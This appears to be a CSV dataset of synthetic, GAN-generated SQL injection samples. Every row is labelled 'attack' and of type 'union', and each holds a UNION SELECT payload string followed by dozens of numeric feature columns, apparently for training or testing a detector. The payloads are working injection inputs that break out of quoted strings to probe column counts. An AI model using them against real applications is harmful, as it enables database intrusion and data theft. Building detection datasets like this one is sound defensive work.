id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,payload_length,alpha_count,digit_count,space_count,upper_count,lower_count,symbol_count,printable_ratio,alpha_ratio,digit_ratio,space_ratio,symbol_ratio,entropy,single_quote_count,double_quote_count,dash_count,hash_count,slash_count,backslash_count,left_paren_count,right_paren_count,comma_count,semicolon_count,equals_count,greater_count,less_count,percent_count,plus_count,asterisk_count,at_count,url_encoded_count,hex_literal_count,unicode_escape_count,comment_marker_count,comparison_op_count,function_call_count,quoted_string_count,kw_select,kw_union,kw_where,kw_from,kw_sleep,kw_benchmark,kw_pg_sleep,kw_waitfor,kw_delay,kw_case,kw_when,kw_then,kw_else,kw_end,kw_exists,kw_order,kw_group,kw_having,kw_information_schema,kw_sysibm,kw_mysql,kw_sqlite,kw_substring,kw_substr,kw_ascii,kw_char,kw_cast,kw_convert,kw_concat,kw_update,kw_delete,kw_insert,kw_drop,kw_create,kw_table,kw_database,kw_user,kw_version,kw_and,kw_or,kw_not,kw_like,kw_by,sql_keyword_total,boolean_signal,union_signal,time_signal,error_signal,order_signal,exists_signal,stacked_signal
GAN_000266,attack,union,"1'  )   as vpop where 2528  =  2528 union all select null,null,null,null,null,null,null#",nearest_attack_euclidean,R000339,4.774558796211212,89.97044372558594,41.56494140625,1.782901644706726,21.063846588134766,-0.4700086712837219,63.13542938232422,11.319307327270508,1.316178560256958,0.6365542411804199,0.07755213975906372,0.23292841017246246,0.1232258677482605,3.9611058235168457,1.0723530054092407,0.31971192359924316,0.05885140970349312,0.8650997877120972,0.007713298313319683,0.26124247908592224,0.5346124172210693,0.47421520948410034,4.499001502990723,0.005125802010297775,1.1105061769485474,0.69230717420578,0.09301116317510605,-0.03509664162993431,0.36654314398765564,0.30246981978416443,0.09689397364854813,0.03323768079280853,-0.30815190076828003,-0.1599193513393402,1.1319599151611328,1.3513530492782593,0.08181852102279663,0.21059063076972961,1.4334537982940674,1.126085877418518,1.125826120376587,0.3863064646720886,0.30601468682289124,0.038801662623882294,-0.6647339463233948,0.09496334940195084,0.5106255412101746,0.02782880887389183,-0.18555957078933716,0.3836807608604431,-0.04090177267789841,-0.13939529657363892,0.5875220894813538,0.029354318976402283,-0.45458051562309265,0.4014255702495575,-0.004225964657962322,0.47577065229415894,-0.23370841145515442,-0.2289016991853714,-0.45847201347351074,-0.19137492775917053,-0.5065234303474426,0.00034137151669710875,0.47609296441078186,-0.5774974822998047,-0.35978254675865173,0.24941633641719818,-0.20501326024532318,-0.05920162796974182,0.11288723349571228,-0.16162413358688354,0.3259006142616272,0.8378288149833679,-0.22224369645118713,0.22007685899734497,-0.0033709651324898005,0.17420807480812073,-0.6398717761039734,0.3064863085746765,-0.11072400957345963,5.181013584136963,-0.005735553335398436,1.0423558950424194,0.38011398911476135,-0.17271193861961365,-0.2905403971672058,0.057754997164011,-0.0010391229297965765
GAN_000267,attack,union,"-2382%'  )   union all select 8885,8885,8885,8885,8885,8885,8885#",nearest_attack_euclidean,R001354,7.494329783286945,44.56562423706055,11.163990020751953,12.181740760803223,10.389681816101074,-1.9272538423538208,2.876915454864502,12.219752311706543,1.2425236701965332,0.5173993706703186,0.551558256149292,0.07579384744167328,0.21441099047660828,3.5651164054870605,0.16714824736118317,0.2409961074590683,1.7288893461227417,0.4888797998428345,-0.036862265318632126,0.2942584753036499,0.01014755666255951,2.019778251647949,7.981611728668213,0.013320800848305225,-0.8911092877388,0.6933133006095886,0.17314964532852173,0.5883052945137024,-0.12752842903137207,0.21530671417713165,-0.4511576294898987,0.5224252939224243,-1.317388653755188,-0.37522298097610474,0.8350253105163574,-1.090078353881836,-0.22276785969734192,-0.4870587885379791,0.5177707076072693,1.5755397081375122,-0.2136029154062271,-0.0455716997385025,0.8233217000961304,0.29441919922828674,-0.8800997734069824,-0.4310441017150879,0.9425227046012878,-0.5377569198608398,-0.4687618911266327,0.39389148354530334,-0.323483943939209,0.8636503219604492,2.2095038890838623,-0.1663670539855957,-0.7325689196586609,-0.256912499666214,-0.01622449979186058,0.02490084432065487,-0.07916621118783951,0.1819135546684265,-1.3457481861114502,-0.4841155707836151,-0.2258618175983429,0.0051436577923595905,0.31575554609298706,-0.1964905858039856,-0.7347672581672668,0.27970534563064575,-0.4126894176006317,0.09853094816207886,-0.013908818364143372,-0.24280256032943726,0.43066537380218506,1.1416099071502686,0.18813931941986084,0.23147466778755188,-0.023974508047103882,-0.013118958100676537,-1.2522038221359253,0.600530743598938,-0.2568044066429138,1.5893746614456177,-0.1263534277677536,1.2691575288772583,-0.7049188017845154,-0.906304121017456,-0.3865310847759247,0.5094345808029175,-0.014751569367945194
GAN_000268,attack,union,"-2382%'  )   union all select 8885,8885,8885,8885,8885,8885,8885#",nearest_attack_euclidean,R001354,4.932786929021661,53.851993560791016,17.73322296142578,17.639259338378906,8.934674263000488,-0.8291857242584229,9.638813972473145,10.519989013671875,1.1751316785812378,0.4855610728263855,0.5126721858978271,0.14929631352424622,0.18844419717788696,3.50494647026062,0.127470925450325,0.23822973668575287,1.731400728225708,0.5160972476005554,0.010070358403027058,0.20445187389850616,-0.07903362810611725,1.7618050575256348,6.3029255867004395,0.0061482214368879795,-0.4599044620990753,0.5562831163406372,0.10610280185937881,0.5783804655075073,0.10688912868499756,0.20895074307918549,-0.26148906350135803,0.3583206534385681,-0.7329162955284119,-0.22055388987064362,0.9176182150840759,-0.4186321794986725,-0.06561268121004105,-0.15398457646369934,0.7322871685028076,1.0365254878997803,-0.16439189016819,-0.07992741465568542,0.369758278131485,0.15696421265602112,-0.8561471700668335,-0.34190312027931213,0.7835413813591003,-0.5574606657028198,-0.06848032772541046,0.06461226940155029,0.14100554585456848,0.1326683759689331,1.4567526578903198,-0.010795824229717255,-0.3304522931575775,0.47120583057403564,0.0031920969486236572,0.5319395065307617,-0.6088566780090332,0.08537133783102036,-0.604642391204834,-0.3833567798137665,-0.2943207919597626,0.00508172158151865,0.3231445550918579,-0.381531298160553,-0.30998122692108154,-0.10266244411468506,-0.42006993293762207,0.18781323730945587,0.06852477043867111,-0.30105793476104736,0.19885846972465515,0.7261508107185364,0.3630559742450714,0.1873406320810318,-0.008967630565166473,0.07183240354061127,-0.48489516973495483,0.7501310706138611,-0.3081270754337311,1.6513293981552124,-0.150108203291893,1.330393671989441,-0.06763341277837753,-0.38787588477134705,-0.1420467644929886,-0.13598544895648956,-0.01336031872779131
GAN_000269,attack,union,"-2207%'   )    )    union all select 3339,3339,3339,3339,3339,3339#",nearest_attack_euclidean,R001522,4.476072810913837,59.150718688964844,25.522197723388672,15.13994026184082,10.48727035522461,-0.15906383097171783,18.514793395996094,9.758186340332031,1.441787600517273,0.4911460280418396,0.41125819087028503,0.1900760382413864,0.16059783101081848,3.4478988647460938,0.030893882736563683,0.3449743092060089,1.5243327617645264,0.5203091502189636,0.01027311198413372,0.1522357165813446,-0.019433647394180298,1.484434723854065,4.868293762207031,0.006806729361414909,-0.07744691520929337,0.5769121050834656,0.15245747566223145,0.6077497601509094,0.1119065061211586,0.20617465674877167,-0.18876713514328003,0.44414275884628296,-0.44051462411880493,-0.21003779768943787,0.9672019481658936,0.23186729848384857,0.007675311528146267,-0.08968690782785416,0.921253502368927,0.9628627300262451,0.11097251623868942,-0.03348034620285034,0.21591205894947052,0.20613734424114227,-0.5342609882354736,-0.32573452591896057,0.6153521537780762,-0.5077992677688599,-0.09083124250173569,-0.037240903824567795,0.19306592643260956,-0.04577913507819176,0.9226264357566833,0.3203858435153961,0.12537825107574463,0.4692451059818268,0.008001885376870632,0.3437054753303528,-0.7251574397087097,0.04880955070257187,-0.3290233314037323,0.08002068102359772,-0.49381643533706665,0.002439408330246806,0.9281212687492371,-0.3388630747795105,0.11889827251434326,-0.06118880212306976,-0.26702725887298584,-0.12835070490837097,0.26076364517211914,-0.4353559613227844,-0.007417295128107071,0.6382167339324951,0.5287821292877197,0.19495399296283722,-0.01033011544495821,0.1433187872171402,-0.18180400133132935,0.5041601657867432,-0.4113498628139496,2.263420581817627,-0.13905328512191772,1.4269485473632812,-0.057075269520282745,-0.11237349361181259,-0.35421469807624817,-0.2938825786113739,-0.0016715333331376314
GAN_000270,attack,union,"1'  )   where 8211  =  8211 union all select null,null,null,null,null#",nearest_attack_euclidean,R000293,3.835163419624922,72.47087097167969,37.10115432739258,4.971929550170898,18.40116310119629,0.323355495929718,43.4754753112793,9.704341888427734,1.2260024547576904,0.5828733444213867,0.1501748412847519,0.24454265832901,0.12463074922561646,3.8607358932495117,0.6036027073860168,0.27278774976730347,0.45967692136764526,0.6968477368354797,0.0151764415204525,0.2143930047750473,0.20538905262947083,0.9986148476600647,4.145580291748047,0.02292017638683319,0.7180863618850708,0.1477351039648056,0.1080269068479538,0.3174293637275696,0.2518267035484314,0.21746589243412018,0.14559030532836914,0.17367573082447052,-0.2433374524116516,-0.18836598098278046,1.1172136068344116,0.9219499826431274,0.06816734373569489,0.13979686796665192,1.3455601930618286,0.9884805083274841,0.5844377875328064,0.2529371976852417,0.11637179553508759,0.10459993034601212,-0.5023713111877441,-0.13969454169273376,0.22820988297462463,0.07802264392375946,-0.32415711879730225,-0.15382634103298187,0.21445979177951813,-0.27900975942611694,0.1052745059132576,0.20715555548667908,-0.08443152159452438,0.1745750606060028,-0.0036706237588077784,0.22471503913402557,-0.42024344205856323,-0.2280377894639969,-0.1241915225982666,-0.07136040925979614,-0.3439854085445404,-0.0019634400960057974,0.6747924089431763,-0.28460708260536194,-0.38633525371551514,0.05163651704788208,-0.1521599441766739,-0.2803611755371094,0.2970064878463745,-0.3036448061466217,0.026437927037477493,0.5398768186569214,-0.05387989059090614,0.24553914368152618,0.0038004659581929445,0.19386160373687744,-0.02942119538784027,0.2111051380634308,-0.23531293869018555,4.116765022277832,-0.04301254078745842,1.1505756378173828,-0.30207592248916626,-0.16916927695274353,-0.40317174792289734,-0.16854068636894226,-0.02031923085451126
GAN_000271,attack,union,"-5771'   )    )    union all select 2833,2833,2833,2833,2833,2833--",nearest_attack_euclidean,R000328,3.989415720985297,60.69301223754883,20.434078216552734,18.679494857788086,12.535780906677246,-0.5169153809547424,16.015121459960938,9.938042640686035,0.9313743114471436,0.4826667308807373,0.35693833231925964,0.16462908685207367,0.1777237355709076,3.6445822715759277,0.3928374648094177,0.4211689233779907,1.7129600048065186,0.36567074060440063,0.008237853646278381,0.1446373015642166,-0.04869699478149414,1.8040543794631958,7.1035919189453125,0.011215046979486942,-0.18998071551322937,0.290630578994751,0.12493953108787537,0.3924485146999359,0.06310243159532547,0.2137266993522644,-0.1332029104232788,0.35715049505233765,-0.5972830057144165,-0.11801806092262268,0.9514796733856201,-0.1825353354215622,-0.07515829056501389,-0.13974563777446747,0.8588602542877197,0.771284818649292,0.0067388336174190044,0.06395191699266434,0.141885444521904,0.19761689007282257,-0.5948477983474731,-0.14899739623069763,0.2285189926624298,-0.3139207065105438,0.08615083247423172,0.07020170986652374,0.20393496751785278,0.2381671965122223,0.8213846683502197,0.12436337023973465,-0.33179378509521484,0.38658320903778076,-0.004873188678175211,0.35966166853904724,-0.2227289080619812,0.005272574722766876,-0.2505350112915039,-0.0610959529876709,-0.13502144813537598,-0.005962484050542116,-0.03654982149600983,-0.43725594878196716,-0.4300101399421692,0.010758660733699799,-0.10520164668560028,0.2397163212299347,-0.10355910658836365,-0.16905944049358368,0.04088962823152542,0.625730037689209,0.21077319979667664,0.16053038835525513,-0.0033233833964914083,0.004652330186218023,-0.275825560092926,0.12585943937301636,-0.31730765104293823,2.211365222930908,-0.08582957088947296,1.1954424381256104,-0.24936968088150024,-0.4790111184120178,-0.212356835603714,0.23859411478042603,-0.011759401299059391
GAN_000272,attack,union,"1'  )   as siyk where 1514  =  1514 union all select null,null,null,null,null,null#",nearest_attack_euclidean,R000382,3.6844693939630133,84.25814819335938,35.49763107299805,4.632383346557617,20.803138732910156,0.06585726886987686,52.4842643737793,10.473962783813477,1.2130776643753052,0.6062521934509277,0.08820702135562897,0.21577252447605133,0.12689314782619476,3.9156382083892822,0.7805443406105042,0.24796168506145477,0.24974875152111053,0.7871021032333374,-0.015984226018190384,0.18839719891548157,0.33193960785865784,1.0239309072494507,4.108935832977295,0.021113157272338867,0.9054524302482605,0.47452110052108765,0.09674849361181259,0.10319340229034424,0.1563664674758911,0.25935614109039307,0.033742133527994156,0.10468468070030212,-0.3603958189487457,-0.2842140197753906,1.0726840496063232,1.089856743812561,0.056067369878292084,0.09743426740169525,1.3168374300003052,1.194382905960083,0.9049515724182129,0.29488638043403625,0.12861080467700958,0.00023643672466278076,-0.28123676776885986,-0.019536592066287994,0.17974281311035156,0.06433066725730896,-0.3817370533943176,0.1854751706123352,-0.06647960841655731,0.11334352195262909,0.33413955569267273,0.2618778645992279,-0.07623765617609024,0.011354885995388031,-0.01136704534292221,0.15473873913288116,0.11286096274852753,-0.18803884088993073,-0.30380862951278687,-0.25097161531448364,-0.2504950165748596,-0.0007977088098414242,0.46329206228256226,-0.22435438632965088,-0.49335047602653503,0.2920994758605957,-0.2313280552625656,-0.048425257205963135,-0.062437549233436584,0.026404492557048798,0.06504157930612564,0.5556467175483704,-0.2978334128856659,0.21914425492286682,-0.0022804609034210443,0.20136338472366333,-0.5395652651786804,-0.13994114100933075,-0.00241938978433609,4.562382221221924,0.03566359728574753,1.2041889429092407,-0.054709114134311676,-0.4426918029785156,-0.6112406253814697,0.2615501880645752,-0.001980837667360902
GAN_000273,attack,union,"1'  )   where 1577  =  1577 union all select null,null,null,null,null,null#",nearest_attack_euclidean,R000314,4.12259205183863,72.51227569580078,32.679168701171875,7.426891326904297,14.908697128295898,-0.37173765897750854,38.65704345703125,10.987390518188477,1.4914073944091797,0.5343503952026367,0.3060215711593628,0.21497231721878052,0.1425759494304657,3.835873603820801,0.5101085305213928,0.21821068227291107,0.7578549981117249,0.7542996406555176,-0.0013629631139338017,0.21931308507919312,0.2152484655380249,0.9377825260162354,4.483742713928223,0.0018544233171269298,0.49151191115379333,0.49561813473701477,0.075246661901474,0.23030655086040497,0.16143569350242615,0.23380246758460999,0.019689496606588364,-0.021463878452777863,-0.3544504642486572,-0.1456480324268341,1.0425180196762085,0.5867469906806946,0.049636613577604294,0.08135443925857544,1.1856144666671753,1.2136411666870117,0.38476288318634033,0.1308380365371704,0.3550114333629608,0.07698951661586761,-0.7640718221664429,-0.058915697038173676,0.4557425081729889,0.025405552238225937,-0.3547641932964325,0.07908159494400024,-0.05795682221651077,-0.08942823857069016,0.5863221883773804,-0.05539209395647049,-0.39310404658317566,0.30946627259254456,-0.0016225696308538318,0.38593196868896484,-0.3035108149051666,0.05301085114479065,-0.617443323135376,-0.2998277246952057,-0.26981088519096375,0.008558469824492931,0.47007450461387634,-0.5354129076004028,-0.2812114357948303,0.035259321331977844,-0.17062069475650787,-0.04311315715312958,0.3845323920249939,-0.059494756162166595,0.4121508300304413,0.6658473610877991,0.14767372608184814,0.1826748549938202,-0.001857233582995832,0.20489433407783508,-0.5076914429664612,0.4632115364074707,-0.06480737775564194,3.637308359146118,-0.01857588440179825,1.3937363624572754,0.043671682476997375,-0.02076619118452072,-0.19802074134349823,-0.2628423273563385,-0.004507919307798147
GAN_000274,attack,union,"1'  )   as vpop where 2528  =  2528 union all select null,null,null,null,null,null,null#",nearest_attack_euclidean,R000339,4.979493888210373,89.06758117675781,46.076045989990234,1.3816336393356323,24.003870010375977,-0.08965868502855301,64.3812255859375,10.926349639892578,1.3730521202087402,0.6273006200790405,0.0016375503037124872,0.2233165055513382,0.10727472603321075,3.9690451622009277,1.135322093963623,0.25759491324424744,-0.016226956620812416,0.8125118613243103,-0.0017035133205354214,0.23672273755073547,0.627906322479248,0.7292171120643616,4.415248870849609,0.014200933277606964,1.1146341562271118,0.47949710488319397,0.12008105963468552,0.02287195809185505,0.2827014923095703,0.2855820953845978,0.10044543445110321,0.08112023770809174,-0.07952326536178589,-0.3338247537612915,1.1909784078598022,1.52866530418396,0.11967714130878448,0.24504312872886658,1.5045206546783447,1.110952615737915,1.3330870866775513,0.4676215648651123,0.22934934496879578,-0.11847962439060211,-0.4619538187980652,0.009290844202041626,0.3555392622947693,0.09210111200809479,-0.12358458340167999,0.22387561202049255,-0.3362486958503723,-0.15528756380081177,0.5580835938453674,0.24160358309745789,-0.2623482942581177,0.19718731939792633,0.0011940974509343505,0.11591649800539017,-0.1978529840707779,-0.18622957170009613,-0.40619489550590515,-0.2611323595046997,-0.48297250270843506,-0.003402318572625518,0.6491459608078003,-0.2851214110851288,-0.41795700788497925,-0.04495960474014282,-0.22426703572273254,-0.28752756118774414,0.05285321921110153,-0.03266661614179611,0.08669748157262802,0.6314887404441833,-0.4181344211101532,0.1781018227338791,0.00061783631099388,0.23634150624275208,-0.5914530158042908,0.0658426508307457,-0.20782777667045593,5.428736209869385,0.012187754735350609,1.0684175491333008,0.2072303593158722,-0.25798237323760986,-0.39441996812820435,0.06670080125331879,0.0017006779089570045
GAN_000275,attack,union,"1'  )   as siyk where 1514  =  1514 union all select null,null,null,null,null,null#",nearest_attack_euclidean,R000382,4.600389574545864,87.59839630126953,41.34673309326172,2.866846799850464,22.194265365600586,0.07750152796506882,61.95682907104492,10.556803703308105,1.4438774585723877,0.637736976146698,0.04978149011731148,0.23612084984779358,0.11742483824491501,4.035023212432861,0.985863208770752,0.16523469984531403,0.0006531974067911506,0.9010487794876099,-0.0017843691166490316,0.23989051580429077,0.49604275822639465,0.6119272708892822,3.856321096420288,0.017425060272216797,1.1326053142547607,0.5633487105369568,0.09646514058113098,0.02426290698349476,0.28577834367752075,0.28238844871520996,0.15802399814128876,-0.1226089671254158,-0.137040913105011,-0.15653595328330994,1.1375527381896973,1.3840277194976807,0.12884344160556793,0.2128918170928955,1.4568591117858887,1.1702845096588135,1.1923727989196777,0.3800016939640045,0.33619424700737,-0.1574903279542923,-0.5044578313827515,-0.05039454251527786,0.31288227438926697,0.22255666553974152,-0.31700006127357483,0.24690291285514832,-0.13930274546146393,-0.11984357237815857,0.30282920598983765,0.10487281531095505,-0.25861063599586487,0.12969791889190674,-0.0023492230102419853,0.21661318838596344,-0.12467432022094727,-0.2993454337120056,-0.5318471193313599,-0.3098815679550171,-0.46437621116638184,0.0018910040380433202,0.4717625379562378,-0.32358163595199585,-0.5566335916519165,0.19804267585277557,-0.17842477560043335,-0.16548289358615875,0.04215526953339577,-0.1291390210390091,0.15840908885002136,0.6512675285339355,-0.3980422616004944,0.22748681902885437,-0.00262526236474514,0.18516740202903748,-0.6112754940986633,0.1896277368068695,-0.13139140605926514,5.4443159103393555,0.03611757233738899,1.070417046546936,0.08634915947914124,-0.2188362181186676,-0.4496628940105438,0.11272259056568146,-0.005688492674380541
GAN_000276,attack,union,"-2287'   )    )    union all select 1200,1200,1200,1200,1200#",nearest_attack_euclidean,R001093,4.021160562162618,64.8809814453125,27.059627532958984,13.148406028747559,11.032614707946777,-0.4230261445045471,26.7158145904541,10.87190055847168,1.2633190155029297,0.44315704703330994,0.39654046297073364,0.18336954712867737,0.15464918315410614,3.6187663078308105,0.25744661688804626,0.18473464250564575,1.278092622756958,0.565312922000885,-0.003931588493287563,0.1694878190755844,0.016734331846237183,1.2864526510238647,4.6725640296936035,-0.0028969573322683573,0.14638367295265198,0.4845556914806366,0.06587116420269012,0.37960362434387207,0.07617794722318649,0.2503708004951477,-0.07589831948280334,0.0007581934332847595,-0.4775024652481079,-0.06533577293157578,0.9790900349617004,0.31153830885887146,0.050221480429172516,-0.021980995312333107,0.9591562151908875,1.1181349754333496,0.20377369225025177,0.006014896556735039,0.3550369143486023,0.1508222073316574,-0.4637783169746399,-0.020422600209712982,0.6294741630554199,-0.05373484641313553,-0.32847580313682556,0.07910871505737305,-0.09481071680784225,0.07331643998622894,0.661065399646759,0.023066841065883636,-0.12612557411193848,0.258964866399765,-0.0008124425658024848,0.35552889108657837,-0.3061600923538208,0.4434489607810974,-0.5888696908950806,-0.26367297768592834,-0.1934340000152588,0.013701539486646652,0.5848238468170166,-0.3175244927406311,-0.024189863353967667,0.017383866012096405,-0.16669274866580963,-0.042210280895233154,0.37805071473121643,-0.2633889317512512,0.3941262364387512,0.5411902666091919,0.23297223448753357,0.16099442541599274,-0.0023176625836640596,0.15273046493530273,-0.5366145372390747,0.35551387071609497,-0.21582764387130737,2.8164095878601074,-0.022791042923927307,1.6058471202850342,-0.06485915929079056,-0.12097028642892838,-0.28638267517089844,-0.3501957058906555,0.003749504452571273
GAN_000277,attack,union,"-6580'  )   union all select 9950,9950,9950,9950,9950,9950--",nearest_attack_euclidean,R000986,4.2984602733005275,54.80488204956055,17.462820053100586,18.588327407836914,10.491433143615723,-0.8884137868881226,13.0564603805542,10.665449142456055,1.3080620765686035,0.49029985070228577,0.4251321256160736,0.1386280059814453,0.18273046612739563,3.6657848358154297,0.38865894079208374,0.1988469958305359,1.780834436416626,0.4520707428455353,-0.009077985771000385,0.18406164646148682,0.07835006713867188,1.732765555381775,6.943499565124512,0.012518053874373436,-0.3613174855709076,0.36980846524238586,0.12451237440109253,0.4991365373134613,-0.005511696450412273,0.17301973700523376,-0.16066038608551025,0.08312433958053589,-0.5260898470878601,-0.1401076316833496,0.9209412336349487,-0.31458815932273865,-0.06876639276742935,-0.20652812719345093,0.8498093485832214,1.1422538757324219,0.047655366361141205,-0.01167859323322773,0.44271963834762573,0.1212887167930603,-0.6437128186225891,-0.13059374690055847,0.3302578926086426,-0.1348932832479477,-0.0724199116230011,0.10749112069606781,-0.03886912018060684,0.36181116104125977,1.015057921409607,-0.21442803740501404,-0.39447981119155884,0.051749520003795624,-0.0038511224556714296,0.1884126514196396,-0.29483741521835327,0.12027639895677567,-0.7342309951782227,-0.0666399672627449,-0.13026933372020721,0.0024588408414274454,0.1094130128622055,-0.22761820256710052,-0.5458772778511047,-0.06640226393938065,-0.25892189145088196,0.022217966616153717,0.06271973252296448,-0.16111209988594055,0.23604564368724823,0.49583888053894043,0.1751909852027893,0.1675541251897812,-0.015981175005435944,0.01543198898434639,-0.43956029415130615,0.5043126344680786,-0.3863160312175751,2.1283249855041504,-0.08733794093132019,1.3447577953338623,-0.40096646547317505,-0.37123242020606995,-0.27796006202697754,0.16771884262561798,-0.008885261602699757
GAN_000278,attack,union,"1'  )   where 1577  =  1577 union all select null,null,null,null,null,null#",nearest_attack_euclidean,R000314,3.7577607024965904,79.89686584472656,33.912353515625,6.776299476623535,18.16948699951172,-0.3995240330696106,44.518497467041016,11.020739555358887,1.3572120666503906,0.5716133713722229,0.1875176876783371,0.20084911584854126,0.13409475982189178,3.8378798961639404,0.7147970199584961,0.1578509658575058,0.6989380121231079,0.7828779220581055,-0.016994014382362366,0.19362801313400269,0.33711299300193787,0.8659354448318481,4.23415470123291,0.012607929296791553,0.6681388020515442,0.5375836491584778,0.09924609959125519,0.12887287139892578,0.1138480007648468,0.2434539496898651,0.021614324301481247,-0.016962356865406036,-0.39166250824928284,-0.2719268202781677,1.0598657131195068,0.8791524767875671,0.09796717762947083,0.09775360673666,1.2687135934829712,1.2860876321792603,0.7673243880271912,0.2093135118484497,0.3792608678340912,-0.0057965293526649475,-0.3784625828266144,-0.046645037829875946,0.40351203083992004,-0.0005786977708339691,-0.5049716830253601,0.24143987894058228,-0.32129958271980286,0.16524086892604828,0.620541512966156,0.11143190413713455,-0.3174211382865906,-0.007307752966880798,-0.003771174931898713,0.2206881195306778,-0.07707049697637558,0.11278438568115234,-0.6444307565689087,-0.42245548963546753,-0.3472007215023041,0.008236618712544441,0.5792273879051208,-0.21685391664505005,-0.24091045558452606,0.20602668821811676,-0.2471400946378708,-0.05136014521121979,0.2462380975484848,-0.06930489093065262,0.24951185286045074,0.6015018820762634,-0.110710009932518,0.20169591903686523,-0.004831799305975437,0.19328515231609344,-0.6304355263710022,0.2571796476840973,-0.05349154770374298,4.331660747528076,0.02841045893728733,1.2606334686279297,0.033944159746170044,-0.20388451218605042,-0.390968918800354,-0.061125557869672775,-0.004430078435689211
GAN_000279,attack,union,"-4452%"" union all select 7141,7141,7141,7141,7141,7141,7141,7141--",nearest_attack_euclidean,R001405,12.610125053230254,13.999348640441895,-11.50146484375,20.79538917541504,0.03970041498541832,-2.7180960178375244,-33.77546691894531,13.235011100769043,2.032902956008911,0.47250401973724365,0.9461644291877747,0.03653528168797493,0.27550557255744934,3.3079276084899902,-0.6495727896690369,0.268652081489563,2.9993624687194824,0.4732631742954254,-0.039955984801054,0.3166634142398834,-0.23909848928451538,2.9229085445404053,10.317310333251953,0.008486906997859478,-2.055878162384033,0.6402157545089722,0.257072389125824,1.1924285888671875,-0.35037747025489807,0.2316715568304062,-0.861111044883728,0.40336674451828003,-1.627864122390747,-0.4889073967933655,0.6280965209007263,-1.964149832725525,-0.38388457894325256,-0.9029635787010193,0.19433729350566864,1.701987624168396,-0.9389843940734863,-0.5778281092643738,1.1795594692230225,0.30472996830940247,-1.3204989433288574,-0.36938923597335815,1.1139768362045288,-0.09065783023834229,-0.48749494552612305,0.2512453496456146,-0.4347410202026367,1.3366481065750122,2.386622428894043,-0.20433250069618225,-0.558874249458313,-0.5421650409698486,-0.01692529208958149,0.13007143139839172,-0.36151614785194397,0.29572993516921997,-1.8354754447937012,-0.19118405878543854,-0.6199232935905457,0.013542579486966133,0.6580092906951904,-0.28948497772216797,-0.7745336890220642,0.2973056435585022,-0.45787206292152405,0.14102305471897125,0.31857600808143616,-0.3473881185054779,0.9062908887863159,0.9526045322418213,1.1440620422363281,0.25705811381340027,-0.045149415731430054,-0.045207444578409195,-1.2710916996002197,1.1496862173080444,-0.9677538275718689,-0.1311986893415451,-0.25798678398132324,1.598573923110962,-1.4976311922073364,-1.1342909336090088,-0.7865017056465149,0.5382151007652283,-0.018309246748685837
GAN_000280,attack,union,"1'  )   where 1577  =  1577 union all select null,null,null,null,null,null#",nearest_attack_euclidean,R000314,3.988487974705304,73.82036590576172,38.96562576293945,3.9959018230438232,18.40944480895996,0.07276519387960434,41.559783935546875,9.639345169067383,1.1607457399368286,0.6153692007064819,0.12510694563388824,0.2428031712770462,0.1316506415605545,3.809953212738037,0.6450839042663574,0.3572687804698944,0.6505761742591858,0.4920293390750885,0.01607520692050457,0.18547651171684265,0.17318783700466156,1.111451268196106,4.843383312225342,0.024325942620635033,0.6257386207580566,0.08013901114463806,0.1519073247909546,0.306520938873291,0.23927205801010132,0.1648019552230835,0.0436997227370739,0.4362761974334717,-0.41139745712280273,-0.1769346296787262,1.1219244003295898,0.7202176451683044,-0.01779916137456894,0.13560833036899567,1.33408522605896,1.0112762451171875,0.560953676700592,0.20781394839286804,0.05091710388660431,0.2793889343738556,-0.6976792216300964,-0.12165377289056778,0.32669228315353394,-0.06143161654472351,-0.4343193769454956,-0.17237001657485962,0.32732880115509033,-0.1420859396457672,0.16563810408115387,0.08086618036031723,-0.13793295621871948,0.339072585105896,-0.005109837744385004,0.18250581622123718,-0.23702692985534668,-0.17321471869945526,-0.20562630891799927,0.11248825490474701,-0.3911375403404236,-0.008752246387302876,0.6638723611831665,-0.16827329993247986,-0.36565759778022766,-0.044560372829437256,-0.2636699974536896,-0.3887791633605957,0.21378520131111145,-0.42670828104019165,-0.0035674013197422028,0.5945043563842773,-0.110105961561203,0.19381791353225708,-0.0014599427813664079,0.18869583308696747,0.08743588626384735,-0.011073723435401917,-0.3644939661026001,3.4551842212677,-0.05880442634224892,1.0072882175445557,-0.4634537696838379,-0.2618846893310547,-0.3799395263195038,-0.1430726945400238,-0.016461379826068878
